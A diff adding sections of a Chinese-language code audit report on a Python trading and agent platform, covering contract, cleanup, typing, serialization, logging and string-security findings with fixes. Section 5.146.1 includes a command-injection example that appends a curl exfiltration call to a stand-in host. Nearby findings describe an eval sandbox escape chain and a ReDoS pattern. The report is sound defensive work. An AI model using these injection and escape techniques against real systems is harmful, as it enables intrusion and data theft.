+- 实现：[pf_core/strategies/default_equity_strategy.py:93](file:///D:/ZephyrAlpha/src/zephyr/pf_core/strategies/default_equity_strategy.py#L93) — `def generate_target_weights(self) -> list[Order]`
+- 基类要求3个必填参数返回dict[str,float]，子类删除全部参数改返回list[Order]。调用方按基类签名调用直接抛TypeError
+- 修复：统一契约语义，二选一
+
+#### 5.143.2 [HIGH] Protocol声明实例方法但实现用classmethod
+
+- Protocol：[shared/contracts/llm_gateway_protocol.py:72-75](file:///D:/ZephyrAlpha/src/zephyr/shared/contracts/llm_gateway_protocol.py#L72) — `def call(self, ...)`
+- 实现：[autonomy_core/llm_gateway.py:347-349](file:///D:/ZephyrAlpha/src/zephyr/autonomy_core/llm_gateway.py#L347) — `@classmethod def call(cls, ...)`
+- Protocol声明实例方法，实现用classmethod。runtime_checkable的isinstance检查失效
+- 修复：统一为一种语义
+
+#### 5.143.3 [HIGH] Protocol被当作基类显式继承
+
+- [trading/orchestrator/batch_orchestrator.py:90](file:///D:/ZephyrAlpha/src/zephyr/trading/orchestrator/batch_orchestrator.py#L90) — `class BatchOrchestrator(BatchOrchestratorProtocol):`
+- Protocol设计为结构化子类型，不应显式继承。显式继承限制了替换性(LSP)
+- 修复：移除继承关系：`class BatchOrchestrator:`
+
+#### 5.143.4 [HIGH] intent_parser副本修改返回类型破坏契约+Self未导入
+
+- 原始：[autonomy_core/intent_parser.py:149-151](file:///D:/ZephyrAlpha/src/zephyr/autonomy_core/intent_parser.py#L149) — `-> LLMIntentVerdict`
+- 副本：[autonomy_core/parsing/intent_parser.py:144-146](file:///D:/ZephyrAlpha/src/zephyr/autonomy_core/parsing/intent_parser.py#L144) — `-> Self`（Self未导入，运行时抛NameError）
+- 副本修改返回类型为Self(语义错误)，且Self未导入
+- 修复：删除副本，保留原始为SSoT
+
+#### 5.143.5 [HIGH] factor/__init__.py的__all__声明9个符号但无任何import语句
+
+- [factor/__init__.py:41-51](file:///D:/ZephyrAlpha/src/zephyr/factor/__init__.py#L41)
+- `__all__`列出9个符号(FactorBase/FactorMeta/FactorRegistry等)但文件体无任何`from .X import Y`语句。调用方`from zephyr.factor import FactorBase`将抛ImportError
+- 修复：补充导出语句
+
+#### 5.143.6 [HIGH] FactorBase存在3份签名冲突的定义
+
+- [factor/base.py:65](file:///D:/ZephyrAlpha/src/zephyr/factor/base.py#L65) — `compute(self) -> list[FactorSignal]`（无参）
+- [factor/factor_base.py:101](file:///D:/ZephyrAlpha/src/zephyr/factor/factor_base.py#L101) — `compute(self, data, **kwargs) -> pd.Series`（有参）
+- [governance/base.py](file:///D:/ZephyrAlpha/src/zephyr/governance/base.py) — factor/base.py的逐字节副本
+- 同一概念3份定义，参数列表/返回类型/方法名(validate_inputs vs validate)都不同
+- 修复：删除factor/base.py和governance/base.py，保留factor/factor_base.py为唯一SSoT
+
+#### 5.143.7-5.143.19 [MEDIUM] 13组重复ABC各自独立_registry致插件发现失败
+
+- 5.143.7: analytics_base.py 3份重复(governance/ops/reporting) — [governance/analytics_base.py:54](file:///D:/ZephyrAlpha/src/zephyr/governance/analytics_base.py#L54)
+- 5.143.8: default_tca_engine.py循环依赖(reporting↔governance互导) — [reporting/default_tca_engine.py:42](file:///D:/ZephyrAlpha/src/zephyr/reporting/default_tca_engine.py#L42)
+- 5.143.9: backtest_base.py 2份重复(simulation/intelligence) — [simulation/backtest_base.py](file:///D:/ZephyrAlpha/src/zephyr/simulation/backtest_base.py)
+- 5.143.10: risk_manager_base.py 2份重复(risk/risk/cross_asset) — [risk/risk_manager_base.py](file:///D:/ZephyrAlpha/src/zephyr/risk/risk_manager_base.py)
+- 5.143.11: pipeline_lock.py 2份重复(integration/infrastructure) — [integration/pipeline_lock.py](file:///D:/ZephyrAlpha/src/zephyr/integration/pipeline_lock.py)
+- 5.143.12: routing_plugins.py 2份重复(integration/infrastructure) — [integration/routing_plugins.py](file:///D:/ZephyrAlpha/src/zephyr/integration/routing_plugins.py)
+- 5.143.13: telemetry.py 2份重复+MODULE声明冲突(ops声明zephyr.data.asset_inventory.telemetry) — [ops/telemetry.py:1-2](file:///D:/ZephyrAlpha/src/zephyr/ops/telemetry.py#L1)
+- 5.143.14: registry_adapter.py 2份重复(governance/infrastructure) — [governance/registry_adapter.py](file:///D:/ZephyrAlpha/src/zephyr/governance/registry_adapter.py)
+- 5.143.15: contracts.py 2份重复且都声明同一MODULE — [governance/audit_orchestrator/contracts.py](file:///D:/ZephyrAlpha/src/zephyr/governance/audit_orchestrator/contracts.py)
+- 5.143.16: default_capital_allocator.py 2份相同__allocator_id__ — [signal_fundamental/capital/default_capital_allocator.py](file:///D:/ZephyrAlpha/src/zephyr/signal_fundamental/capital/default_capital_allocator.py)
+- 5.143.17: default_equity_strategy.py 3份重复(均含5.143.1的LSP违规) — [pf_core/strategies/default_equity_strategy.py:93](file:///D:/ZephyrAlpha/src/zephyr/pf_core/strategies/default_equity_strategy.py#L93)
+- 5.143.18: broker_interface参数名漂移(broker_order_id→order_id) — [governance/broker_interface.py:76](file:///D:/ZephyrAlpha/src/zephyr/governance/broker_interface.py#L76)
+- 5.143.19: LLMGateway Protocol docstring与签名矛盾 — 见5.143.2
+- 每组各自持有独立`_registry: ClassVar`，子类注册到不同registry导致"插件存在但发现不了"
+- 修复：每组选定一个SSoT，删除其余，统一导入路径
+
+#### 5.143.20-5.143.22 [LOW] 契约悬挂与注解-行为不一致
+
+- 5.143.20 [LOW]: ComplianceManagerBase定义4个抽象方法但全项目无子类实现 — [governance/compliance_manager.py:46](file:///D:/ZephyrAlpha/src/zephyr/governance/compliance_manager.py#L46)
+- 5.143.21 [LOW]: risk_manager.snapshot注解`-> RiskDashboardSnapshot | None`但方法体`raise NotImplementedError` — [risk/risk_manager.py:95-97](file:///D:/ZephyrAlpha/src/zephyr/risk/risk_manager.py#L95)
+- 5.143.22 [LOW]: task_repository_protocol.next_seq参数`namespace: Any = None`应为`str | None` — [shared/contracts/task_repository_protocol.py:174](file:///D:/ZephyrAlpha/src/zephyr/shared/contracts/task_repository_protocol.py#L174)
+
+**N/A维度**：未声明异常(Python无原生raises语法)、typing.overload不匹配(全项目无@overload使用)
+
+**严重度汇总**：HIGH=5, MEDIUM=13, LOW=4, 合计=22
+
+---
+
+### 5.144 资源清理顺序（12个，第25轮新增）
+
+审查资源释放顺序错误、try/finally清理顺序、上下文管理器嵌套错误、连接关闭顺序等问题。
+
+#### 5.144.1 [HIGH] 核心关闭路径4步清理无异常隔离
+
+- [trading/lifecycle_manager.py:145-155](file:///D:/ZephyrAlpha/src/zephyr/trading/lifecycle_manager.py#L145)
+- `shutdown_sequence`顺序执行4步(finalizer→health_monitor→audit_logger→stop_gate)均无try/except。若`finalizer.run()`抛异常，后续3步全被跳过——健康监控线程泄漏、审计日志丢失、停机门禁未确认
+- 修复：每步清理包裹独立try/except，异常收集到report.errors
+
+#### 5.144.2 [MEDIUM] async_runtime finally块异常跳过executor关闭
+
+- [trading/runtime/async_runtime.py:124-148](file:///D:/ZephyrAlpha/src/zephyr/trading/runtime/async_runtime.py#L124)
+- `finally: self._loop.close()`若抛非(TimeoutError, RuntimeError)异常(如OSError/CancelledError)，异常传播出stop()导致`self._executor.shutdown()`被跳过，线程池泄漏
+- 修复：executor关闭也纳入finally或独立try/finally
+
+#### 5.144.3 [MEDIUM] 子进程管道关闭顺序错误（先关管道后终止进程）
+
+- [shared/infra/process_pool.py:240-257](file:///D:/ZephyrAlpha/src/zephyr/shared/infra/process_pool.py#L240)
+- 应先terminate()→wait()→关闭管道(申请逆序释放)，当前先关闭管道再terminate()。关闭stdout/stderr后子进程写日志触发BrokenPipeError，关闭stdin发送EOF让子进程提前退出跳过自身清理
+- 修复：调整为terminate()→wait()→关闭管道
+
+#### 5.144.4 [MEDIUM] auto_runtime_core.shutdown未包裹lifecycle.shutdown_sequence
+
+- [trading/auto_runtime_core.py:491-521](file:///D:/ZephyrAlpha/src/zephyr/trading/auto_runtime_core.py#L491)
+- `_lifecycle.shutdown_sequence()`调用(见5.144.1)无try/except。若抛异常则`self._booted = False`不执行，运行时状态卡在"已关闭但booted=True"
+- 修复：用try/finally保证`self._booted = False`必定执行
+
+#### 5.144.5-5.144.9 [MEDIUM] sqlite连接清理缺失finally（5文件9方法）
+
+- 5.144.5: [intelligence/model_evaluation/sync_engine.py:45-51](file:///D:/ZephyrAlpha/src/zephyr/intelligence/model_evaluation/sync_engine.py#L45) — conn.close()在try块内非finally
+- 5.144.6: [governance/agent_cooldown.py:62-76,88-106,110+](file:///D:/ZephyrAlpha/src/zephyr/governance/agent_cooldown.py#L62) — 3方法(_init_db/quarantine/check)均无finally
+- 5.144.7: [behavioral_audit/correlation_engine.py:67-71,110-116](file:///D:/ZephyrAlpha/src/zephyr/behavioral_audit/correlation_engine.py#L67) — 2方法无finally
+- 5.144.8: [behavioral_audit/dashboard.py:79-85,102-108](file:///D:/ZephyrAlpha/src/zephyr/behavioral_audit/dashboard.py#L79) — 2方法无finally
+- 5.144.9: [behavioral_audit/cold_start.py:185-199](file:///D:/ZephyrAlpha/src/zephyr/behavioral_audit/cold_start.py#L185) — conn.close()在try块内
+- execute/fetchall抛异常时conn.close()被跳过，sqlite3连接持有的文件锁在CPython引用计数回收前不释放
+- 修复：统一改为`with sqlite3.connect(...) as conn:`上下文管理器
+
+#### 5.144.10 [MEDIUM] night_shift_queue 4处Path.open()无with
+
+- [trading/night_shift_queue.py:77,85,104,127](file:///D:/ZephyrAlpha/src/zephyr/trading/night_shift_queue.py#L77)
+- 行77 `Path.open("a").write(line)`不保存文件对象也未用with，文件句柄永远不显式关闭——Windows上文件被独占锁定
+- 修复：所有`path.open(...)`改为`with self._path.open(...) as f:`
+
+#### 5.144.11 [LOW] atexit重复注册
+
+- [behavioral_audit/resource_guard.py:226-233](file:///D:/ZephyrAlpha/src/zephyr/behavioral_audit/resource_guard.py#L226) + drift_detection/resource_guard.py
+- `atexit.register(_cleanup)`位于guard_loop函数体内，每次调用都注册一次。进程退出时同一清理逻辑被多次执行
+- 修复：用模块级标志位保护，仅首次调用时注册
+
+#### 5.144.12 [LOW] system_telemetry facade重复关闭health
+
+- [infrastructure/system_telemetry/facade.py:484-494](file:///D:/ZephyrAlpha/src/zephyr/infrastructure/system_telemetry/facade.py#L484)
+- health已在`reversed(_SHUTDOWN_ORDER)`循环中被shutdown()，循环结束后492-494又对self.health调用set_unhealthy和shutdown()，构成重复清理
+- 修复：从循环后的显式调用中移除health，或从_SHUTDOWN_ORDER中移除health
+
+**N/A维度**：__del__误用(全代码库无def __del__)、上下文管理器嵌套顺序错误(嵌套顺序正确)、连接池父子close顺序(无嵌套场景)、weakref.finalize(未使用)、contextlib.ExitStack(未使用)、async with中await未完成即__aexit__(均不含未完成await)
+
+**严重度汇总**：HIGH=1, MEDIUM=9, LOW=2, 合计=12
+
+---
+
+### 5.145 类型注解完整性（30个，第25轮新增）
+
+审查公共API缺失类型注解、Any滥用、Optional误用、Union滥用、泛型参数缺失、裸dict/list/Callable等问题。
+
+#### 5.145.1-5.145.12 [HIGH] 公共类/方法完全无类型注解+Any滥用最严重文件
+
+- 5.145.1 [HIGH]: [__init__.py:30,70,77,89,104](file:///D:/ZephyrAlpha/src/zephyr/__init__.py#L30) — register_lazy/_LazyModule.__init__/__dir__缺返回类型+Optional导入未使用
+- 5.145.2 [HIGH]: [governance/database_service.py:82,99,105,144,176,182](file:///D:/ZephyrAlpha/src/zephyr/governance/database_service.py#L82) — 6个公共方法缺返回类型+get_depgraph_conn返回Any应为psycopg2 connection
+- 5.145.3 [HIGH]: [governance/audit_trail/models.py:116-281](file:///D:/ZephyrAlpha/src/zephyr/governance/audit_trail/models.py#L116) — AuditChain/AuditEntryV1/LamportClock等10+类__init__参数和公共方法全部裸用
+- 5.145.4 [HIGH]: [governance/audit_trail/trust_engine.py:98-122](file:///D:/ZephyrAlpha/src/zephyr/governance/audit_trail/trust_engine.py#L98) — TrustAdjustment/TrustRecord/TrustScoreEngine全无类型+**隐藏NameError Bug**(行109 `self.trust_score = trust - score`，trust和score未定义)
+- 5.145.5 [HIGH]: [governance/audit_trail/writer.py:98-120](file:///D:/ZephyrAlpha/src/zephyr/governance/audit_trail/writer.py#L98) — AuditWriter类+工厂函数+_generate_entry_id+_resolve_hmac_key全无类型(同文件AuditReportWriter注解完整，两风格并存)
+- 5.145.6 [HIGH]: [governance/audit_trail/tiered_storage.py:105-138](file:///D:/ZephyrAlpha/src/zephyr/governance/audit_trail/tiered_storage.py#L105) — MigrationRecord/TierConfig/TieredStorageManager全无类型(同文件TieredStorage注解完整)
+- 5.145.7 [HIGH]: [governance/audit_orchestrator/cold_start.py:106-132](file:///D:/ZephyrAlpha/src/zephyr/governance/audit_orchestrator/cold_start.py#L106) — ColdStartResult+3个公共函数(detect_missing_env/init_database/init_directories)全无类型
+- 5.145.8 [HIGH]: [governance/config.py:231-249](file:///D:/ZephyrAlpha/src/zephyr/governance/config.py#L231) — AppConfig+load_config/reload_config/_deep_merge_lists全无类型
+- 5.145.9 [HIGH]: [infrastructure/system_telemetry/metrics/__init__.py:26-47](file:///D:/ZephyrAlpha/src/zephyr/infrastructure/system_telemetry/metrics/__init__.py#L26) — MetricSnapshot/MetricsRegistry全无类型+get_registry无返回类型
+- 5.145.10 [HIGH]: [security/llm_defense/llm_security/layers/l6_observability.py](file:///D:/ZephyrAlpha/src/zephyr/security/llm_defense/llm_security/layers/l6_observability.py) — 29处Any(全项目单文件第二)，含`add_noise(value: Any) -> Any`最坏模式
+- 5.145.11 [HIGH]: [trading/orchestrator/trigger_router.py](file:///D:/ZephyrAlpha/src/zephyr/trading/trigger_router.py) — 31处Any(全项目最高)，audit_logger: Any | None出现3次(应为Protocol)
+- 5.145.12 [HIGH]: [ops/scheduler.py](file:///D:/ZephyrAlpha/src/zephyr/ops/scheduler.py) — 22处Any，anomaly/diagnosis/action/verification四个核心域对象全用Any(应有具体类型)
+
+#### 5.145.13-5.145.27 [MEDIUM] Any滥用>5处的文件+前向引用误用+裸dict/list/Callable
+
+- 5.145.13 [MEDIUM]: [autonomy_core/context_budget_tracker.py:142,252](file:///D:/ZephyrAlpha/src/zephyr/autonomy_core/context_budget_tracker.py#L142) — TYPE_CHECKING块已导入DocCompressor但字段用Any|None(注释写明是DocCompressor)
+- 5.145.14 [MEDIUM]: [integration/vector_memory/in_process_vector_memory.py:68-122](file:///D:/ZephyrAlpha/src/zephyr/integration/vector_memory/in_process_vector_memory.py#L68) — 6个_init_*方法内部导入具体类但返回Any，bridge_layer/vector_bridge属性返回Any
+- 5.145.15 [MEDIUM]: [trading/orchestrator/alert_handler.py:38,171](file:///D:/ZephyrAlpha/src/zephyr/trading/orchestrator/alert_handler.py#L38) — handle_alert注解`-> Any | None`实际返回`TaskCard | None`
+- 5.145.16 [MEDIUM]: l5_resource_protection.py 20处Any(含`detect_asymmetry(request: Any, response: Any)`)
+- 5.145.17 [MEDIUM]: l4_agent.py 17处Any(action/transaction/action_history全用Any)
+- 5.145.18 [MEDIUM]: l8_multi_agent.py 14处Any(含`expires_at: Any = None`应为datetime|None)
+- 5.145.19 [MEDIUM]: l7_validation.py 25处Any(含`trigger_security_regression(regression_type: Any, gateway: Any = None) -> Any`)
+- 5.145.20 [MEDIUM]: injection_patterns.py 19处Any(含`_compile -> list[tuple[Any, str]]`应为`re.Pattern[str]`)
+- 5.145.21 [MEDIUM]: ops/observability/logging.py 18处Any
+- 5.145.22 [MEDIUM]: 裸dict/list/set未指定元素类型——position_reconciler.py/work_dag.py/risk_mitigation.py/a2a_metrics.py/a2a_dashboard.py/facade.py/a2a_temporal_admission.py/a2a_idempotency.py等(8+处)
+- 5.145.23 [MEDIUM]: 裸Callable未指定签名——event_bus.py/graceful_shutdown.py/config_reload_semantic.py/cross_module_integration.py/push_notifier.py/message_router.py/trigger_router.py(4份)(11处)
+- 5.145.24 [MEDIUM]: l0_supply_chain.py 11处Any+SupplyChainValidator公共类完全无类型
+- 5.145.25 [MEDIUM]: 11个文件Any>5处(l3_output/l1_input/l2a_process_sandbox/gateway/behavior_audit_logger/context_scanner/metrics_collector/health_discovery/scheduler_safety/scheduler_collect_detect/async_runtime)
+- 5.145.26 [MEDIUM]: 13个文件Any>5处(scheduler_act/risk_manager_base×2/default_risk_manager_orchestrator/verdict_engine/resource_optimization/results_writer×2/deepseek_v4_chat×2/task_model_learner×2/exam_judge)
+- 5.145.27 [MEDIUM]: [autonomy_core/skill_cache_provider.py:45,52,60,64,78,89,96,121,126,134,138](file:///D:/ZephyrAlpha/src/zephyr/autonomy_core/skill_cache_provider.py#L45) — 11处`# noqa: ANN`显式抑制缺失注解告警
+
+#### 5.145.28-5.145.30 [LOW] 死代码与装饰器缺返回类型
+
+- 5.145.28 [LOW]: [autonomy_core/dispatch_table.py:34-37](file:///D:/ZephyrAlpha/src/zephyr/autonomy_core/dispatch_table.py#L34) — `if TYPE_CHECKING: pass`死代码
+- 5.145.29 [LOW]: [__init__.py:30](file:///D:/ZephyrAlpha/src/zephyr/__init__.py#L30) — Optional导入未使用(ruff F401在__init__.py被忽略)
+- 5.145.30 [LOW]: [ops/observability/tracing.py:126](file:///D:/ZephyrAlpha/src/zephyr/ops/observability/tracing.py#L126) + shared/observability_02/tracing.py — `traced`装饰器工厂缺返回类型`-> Callable[[F], F]`
+
+**N/A维度**：Optional[List]误用(0匹配)、Union[str,int,float,bool,None]宽泛Union(0匹配)、泛型类未继承Generic[T](10处Generic配对完整)、TYPE_CHECKING块未对应字符串注解(均配合from __future__ import annotations)
+
+**Any滥用统计**：全项目601处Any分布在100个文件，34个文件超过5处阈值
+
+**严重度汇总**：HIGH=12, MEDIUM=15, LOW=3, 合计=30
+
+---
+
+### 5.146 字符串处理安全（6个，第25轮新增）
+
+审查SQL注入、路径遍历、命令注入、格式化字符串注入、ReDoS等字符串安全漏洞。
+
+#### 5.146.1 [MEDIUM] post_sync_standard命令经shell=True执行且校验存在元字符盲区
+
+- [governance/task_repo.py:1811-1817](file:///D:/ZephyrAlpha/src/zephyr/governance/task_repo.py#L1811)
+- `commands`来自任务卡post_sync_standard字段(AI agent建卡写入)，校验仅按`&&`/`||`/`\n`拆分，不处理`;`/`|`/`$()`/反引号/`>`。`shell=True`将完整字符串交给shell解释。攻击路径：`python scripts/validate.py; curl evil/exfil`。违反项目自身`process_sandbox.py:53`的shell=True禁止策略
+- 修复：改为`subprocess.run(shlex.split(cmd), shell=False)`列表形式；或引入命令白名单
+
+#### 5.146.2 [MEDIUM] yaml.load使用FullLoader（非SafeLoader），违反项目自身策略
+
+- [governance/audit_orchestrator/pipeline_runner.py:643](file:///D:/ZephyrAlpha/src/zephyr/governance/audit_orchestrator/pipeline_runner.py#L643) + audit_trail/pipeline_runner.py:646
+- CVE-2020-14343证明FullLoader仍可RCE。项目自身`vibe_security_verify.py:41`将`yaml.load(`判定为no_yaml_unsafe_load违规。项目其余100+处YAML加载均用safe_load，唯独这两处遗留
+- 修复：替换为`yaml.safe_load(f)`
+
+#### 5.146.3 [LOW] eval()处理skip_condition表达式，builtins限制可被对象属性链绕过
+
+- [integration/models.py:601](file:///D:/ZephyrAlpha/src/zephyr/integration/models.py#L601) + infrastructure/pipeline/models.py:602
+- `{"__builtins__": {}}`是弱沙箱——namespace中暴露存活对象ctx，通过`ctx.__class__.__mro__[...].__subclasses__()`可逃逸到__import__。当前skip_condition仅来自硬编码常量(不可利用)，但字段是Pydantic str类型，未来数据驱动即转为RCE
+- 修复：用受限表达式求值器替代eval，或改用声明式条件字段
+
+#### 5.146.4 [LOW] INSERT语句列名来自dict.keys()拼接（值已参数化，列名未参数化）
+
+- [governance/database_service.py:172,315](file:///D:/ZephyrAlpha/src/zephyr/governance/database_service.py#L172)
+- 值通过`?`占位符参数化(安全)，但列名`columns`直接由`task_data.keys()`拼入SQL。当前task_data来自内部服务调用(键固定)，但缺乏防御——若dict键未来来自外部数据可注入
+- 修复：拼接前对列名做白名单校验
+
+#### 5.146.5 [LOW] str.format_map渲染可能外部可控的模板文本
+
+- [autonomy_core/prompt_registry.py:245](file:///D:/ZephyrAlpha/src/zephyr/autonomy_core/prompt_registry.py#L245) + support/prompt_registry.py:244
+- `format_map`支持格式说明符中的属性访问(`{var.__class__}`)。`template_text`是AI可编辑的prompt模板，`effective`字典值虽经str()转换缓解了RCE，但仍是纵深防御缺口
+- 修复：改用`string.Template`(仅${name}替换)或自定义SafeFormatter
+
+#### 5.146.6 [LOW] re.compile编译Pydantic str字段（潜在ReDoS）
+
+- [autonomy_core/pattern_library.py:470](file:///D:/ZephyrAlpha/src/zephyr/autonomy_core/pattern_library.py#L470)
+- `p.detection`是Pydantic str字段。当前默认值为硬编码正则(无灾难性回溯)，但构造函数接受外部patterns，一旦从YAML/DB加载patterns，恶意提交`(a+)+$`即可触发ReDoS
+- 修复：对detection字段增加正则复杂度校验，或引入RE2引擎
+
+**N/A维度**：路径遍历(无外部用户输入直接流入路径拼接)、pickle反序列化(已在5.117覆盖)、os.system(无实际调用)、XXE(项目不使用XML解析)、open()用户输入未realpath(无可利用路径)
+
+**严重度汇总**：HIGH=0, MEDIUM=2, LOW=4, 合计=6
+
+---
+
+### 5.147 序列化/反序列化安全（11个，第25轮新增）
+
+审查json/yaml/toml/pickle/joblib/marshal等序列化格式的安全问题、版本兼容性、循环引用序列化失败等。
+
+#### 5.147.1 [HIGH] joblib.load加载参数化路径的模型文件（等价pickle反序列化）
+
+- [intelligence/model_evaluation/implementations/default_inference_engine.py:71](file:///D:/ZephyrAlpha/src/zephyr/intelligence/model_evaluation/implementations/default_inference_engine.py#L71) + ml_train/implementations/default_inference_engine.py:69
+- `joblib.load`内部使用`pickle.load`，可在反序列化时执行任意代码。`model_path`是公共方法参数，无任何校验(签名验证/来源白名单)。若model_path可被外部配置影响，攻击者可构造恶意.joblib文件实现RCE
+- 修复：对模型文件做哈希/签名验证；或改用skops.io.load；至少在类型签名中约束model_path必须来自可信分发渠道
+
+#### 5.147.2 [MEDIUM] yaml.load使用FullLoader（与5.146.2同源，此处归入序列化维度）
+
+- 见5.146.2 — 2处pipeline_runner.py使用`yaml.load(f, Loader=yaml.FullLoader)`
+- 修复：替换为`yaml.safe_load(f)`
+
+#### 5.147.3 [MEDIUM] MCP stdio服务器Content-Length无上限+json.loads无大小限制
+
+- [infrastructure/_base_server.py:453-460,494,552](file:///D:/ZephyrAlpha/src/zephyr/infrastructure/_base_server.py#L453)
+- `_read_message`从stdin读取Content-Length头后直接`inp.read(content_length)`，无上限。恶意客户端可发送`Content-Length: 999999999999`触发OOM Kill
+- 修复：设定MAX_MESSAGE_BYTES(如10MB)，超限返回ERR_PARSE_ERROR
+
+#### 5.147.4 [MEDIUM] json.dumps(default=str)大量用于状态持久化，破坏往返类型保真
+
+- 79+处代表性样本：[behavioral_audit/cascade_detector.py:126](file:///D:/ZephyrAlpha/src/zephyr/behavioral_audit/cascade_detector.py#L126) + canary_controller.py + absence_manager.py + handoff_manager.py + forensics_engine.py + governance/audit_trail/writer.py:78
+- `default=str`是兜底序列化器——datetime变为字符串，加载后无法区分原始字符串还是datetime。handoff_manager.py的load_package被迫用str()逐字段强转补偿
+- 修复：使用项目SSoT序列化模块`zephyr.shared.io.serialization.to_json`/`from_json`
+
+#### 5.147.5 [MEDIUM] asdict()+**data.get(...)模式的版本兼容性缺陷
+
+- [intelligence/model_profiling/capability_passport.py:289-312,500-514](file:///D:/ZephyrAlpha/src/zephyr/intelligence/model_profiling/capability_passport.py#L289)
+- `**data.get("breadth", {})`将保存的dict直接展开为构造函数参数。类新增必填字段→旧JSON缺参TypeError；类删除字段→旧JSON含废弃字段TypeError。虽有passport_version字段但_from_dict完全忽略版本——无迁移逻辑
+- 修复：在_from_dict中读取passport_version按版本迁移；或改用Pydantic model_validate
+
+#### 5.147.6 [MEDIUM] copy.deepcopy处理可能含循环引用的context字典
+
+- [autonomy_core/skill_context_isolation.py:77,115,123](file:///D:/ZephyrAlpha/src/zephyr/autonomy_core/skill_context_isolation.py#L77)
+- `context: dict[str, Any]`值类型为Any——调用方可传入含循环引用的结构。copy.deepcopy遇到循环引用会无限递归抛RecursionError
+- 修复：使用`copy.deepcopy(context, memo={})`并捕获RecursionError；或限制deepcopy深度
+
+#### 5.147.7 [MEDIUM] json.loads(text.replace("'", '"'))启发式解析Python-repr为JSON
+
+- [infrastructure/task_manager_server.py:921](file:///D:/ZephyrAlpha/src/zephyr/infrastructure/task_manager_server.py#L921)
+- 将所有单引号替换为双引号再json.loads——若门禁名称含撇号会破坏字符串边界。except静默吞掉错误导致数据正确性无法保证
+- 修复：使用`ast.literal_eval`安全解析Python字面量
+
+#### 5.147.8 [MEDIUM] SSoT序列化模块from_dict/from_json未按文档承诺还原类型
+
+- [shared/io/serialization.py:163-177,211-233,252-267](file:///D:/ZephyrAlpha/src/zephyr/shared/io/serialization.py#L163)
+- to_dict/to_json正确地将Decimal→str、datetime→ISO 8601序列化。但from_dict/from_json在不提供model参数时，_deserialize_value仅透传str——不会调用已定义的deserialize_decimal/deserialize_datetime还原。文档声称"Decimal/str/datetime已还原"与实现矛盾
+- 修复：在_deserialize_value中对str值尝试deserialize_datetime/deserialize_decimal还原
+
+#### 5.147.9 [LOW] AgentCard.from_dict/SessionInfo.from_dict缺少类型校验
+
+- [infrastructure/a2a_protocol/multi_agent.py:76-84](file:///D:/ZephyrAlpha/src/zephyr/infrastructure/a2a_protocol/multi_agent.py#L76) + security/access_control/session_concurrency.py:176-183
+- `d.get("held_files", [])`若JSON中为null返回None(不是默认值[])，传入dataclass后类型标注list[str]被违反——后续.append()会AttributeError
+- 修复：`held_files=d.get("held_files") or []`处理None
+
+#### 5.147.10 [LOW] gpu_consensus_scheduler从任意文本中启发式提取JSON
+
+- [governance/behavioral_admission/gpu_consensus_scheduler.py:502-505](file:///D:/ZephyrAlpha/src/zephyr/governance/behavioral_admission/gpu_consensus_scheduler.py#L502)
+- `text.find("{")` + `text.rfind("}")`提取JSON。若文本含多段JSON或花括号，text[start:end]可能横跨非JSON内容
+- 修复：使用`json.JSONDecoder().raw_decode`增量解析
+
+#### 5.147.11 [LOW] headless_scanner对子进程stdout做json.loads无大小限制
+
+- [behavioral_audit/headless_scanner.py:81](file:///D:/ZephyrAlpha/src/zephyr/behavioral_audit/headless_scanner.py#L81)
+- `subprocess.run`捕获stdout后直接`json.loads(result.stdout)`。timeout=30限制执行时间但不限制输出量——30秒内可产生数GB文本
+- 修复：json.loads前校验`len(result.stdout) <= MAX_OUTPUT_SIZE`
+
+**N/A维度**：marshal.loads(全项目无使用)、自定义__getstate__/__setstate__(全项目无实现)、shelve模块(全项目无使用)
+
+**严重度汇总**：HIGH=1, MEDIUM=7, LOW=3, 合计=11
+
+---
+
+### 5.148 日志级别使用不当（27个，第25轮新增）
+
+审查日志级别误用、关键错误未日志、正常流程用ERROR级别、敏感信息日志、日志格式不一致等问题。
+
+#### 5.148.1-5.148.13 [HIGH] 关键失败路径静默吞没(except:pass)或严重降级日志(DEBUG)
+
+- 5.148.1 [HIGH]: [__init__.py:138-139](file:///D:/ZephyrAlpha/src/zephyr/__init__.py#L138) — 服务注册失败完全静默吞没(`except Exception: pass`)
+- 5.148.2 [HIGH]: [__init__.py:121-122](file:///D:/ZephyrAlpha/src/zephyr/__init__.py#L121) — auto_bootstrap失败仅置None无日志，系统以"无遥测"模式运行
+- 5.148.3 [HIGH]: [ops/scheduler.py:278-283](file:///D:/ZephyrAlpha/src/zephyr/ops/scheduler.py#L278) — 审计链compromised(安全事件)的bus.emit失败静默吞没+审计链妥协本身仅WARNING
+- 5.148.4 [HIGH]: [ops/scheduler.py:289-290](file:///D:/ZephyrAlpha/src/zephyr/ops/scheduler.py#L289) — 审计链完整性验证整体异常只DEBUG(审计基础设施失效本身比审计链妥协更危险)
+- 5.148.5 [HIGH]: [ops/scheduler.py:310,325](file:///D:/ZephyrAlpha/src/zephyr/ops/scheduler.py#L310) — 漂移扫描与自动修复失败均DEBUG(HIGH严重度漂移永远不会被发现)
+- 5.148.6 [HIGH]: [infrastructure/system_telemetry/facade.py:427,448,458,464,471,490](file:///D:/ZephyrAlpha/src/zephyr/infrastructure/system_telemetry/facade.py#L427) — 6处关键周期任务失败均DEBUG(watchdog/health_aggregator/archive_check/shutdown)
+- 5.148.7 [HIGH]: [infrastructure/system_telemetry/facade.py:135-136](file:///D:/ZephyrAlpha/src/zephyr/infrastructure/system_telemetry/facade.py#L135) — 遥测数据落盘失败仅DEBUG(数据丢失且不可恢复)
+- 5.148.8 [HIGH]: [infrastructure/audit_logger.py:141-142](file:///D:/ZephyrAlpha/src/zephyr/infrastructure/audit_logger.py#L141) + integration/mcp/audit_logger.py:141-142 — 审计事件写入核心审计链失败完全静默(审计链出现缺口无人知晓)
+- 5.148.9 [HIGH]: [behavioral_audit/tamper_proof_audit.py:175-176,200-201,267-268](file:///D:/ZephyrAlpha/src/zephyr/behavioral_audit/tamper_proof_audit.py#L175) — 防篡改审计模块自身3处except:pass(审计工具自身不可审计)
+- 5.148.10 [HIGH]: [trading/auto_runtime_core.py:139-145](file:///D:/ZephyrAlpha/src/zephyr/trading/auto_runtime_core.py#L139) — 资源优化监控启动失败被静默吞没(boot仍报success但缺少关键监控)
+- 5.148.11 [HIGH]: [autonomy_core/context_assembler.py:479-494](file:///D:/ZephyrAlpha/src/zephyr/autonomy_core/context_assembler.py#L479) — 4个VMS检索失败全部静默吞没(AI拿到空上下文不知是真无数据还是检索失败)
